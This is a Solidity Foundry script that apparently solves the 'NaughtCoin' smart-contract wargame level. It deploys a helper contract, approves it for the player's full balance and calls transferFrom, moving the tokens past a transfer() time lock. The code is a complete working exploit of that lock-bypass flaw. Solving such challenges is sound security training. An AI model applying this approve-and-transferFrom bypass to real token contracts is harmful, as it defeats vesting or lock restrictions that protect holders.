// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { NaughtCoin } from "../src/NaughtCoin.sol";

contract Friend {
    NaughtCoin public instance = NaughtCoin(0x1e730809B238A0573625f868aceD21f4972F9b3B);

    constructor () {}
    receive () external payable {}

    function shut_up_and_take_my_money(uint256 balance) external {
        instance.transferFrom(tx.origin, address(this), balance);
    }
}

contract NaughtCoinSolver is Script {

    NaughtCoin public instance = NaughtCoin(0x1e730809B238A0573625f868aceD21f4972F9b3B);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function run() external {
        
        vm.startBroadcast(prv);
        
        Friend my_friend = new Friend();
        uint256 my_balance = instance.balanceOf(me);

        console.log("my balance was ", address(uint160(my_balance)));
        // I allow you my dear friend
        instance.approve(address(my_friend), my_balance);
        my_friend.shut_up_and_take_my_money(my_balance);

        console.log("my balance now is ", address(uint160(instance.balanceOf(me))));
        console.log("now am poor but still happy");
        console.log("at least my friend is rich");

        vm.stopBroadcast();

    }

}

